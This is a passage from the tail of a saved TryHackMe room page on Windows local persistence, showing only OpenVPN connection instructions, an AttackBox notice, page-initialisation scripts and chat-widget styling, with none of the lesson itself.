<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/windowslocalpersistence#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/windowslocalpersistence#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/windowslocalpersistence#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Windows Local Persistence_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Windows Local Persistence_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Windows Local Persistence_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Windows Local Persistence_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Windows Local Persistence_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Windows Local Persistence_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/windowslocalpersistence#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/windowslocalpersistence#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Windows Local Persistence_files/notify.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/api-requests.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/events.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/underscore-min.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Windows Local Persistence_files/chart.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/expire.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/sockets.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/faqSearch.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/certificate.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/utils.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/confetti.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/videos.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/intro.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/prism.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/logic.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/tasks.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/connection-status.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/glossary.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "nE2YsHvN-3eFfoZiusc6dJBunUEjaM7Xw5Hc"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "windowslocalpersistence"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="48E90951-D961-78E6-87E4-EB3A051E6DAF"></div><iframe id="_hjSafeContext_86969607" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Windows Local Persistence_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Windows Local Persistence_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Windows Local Persistence_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>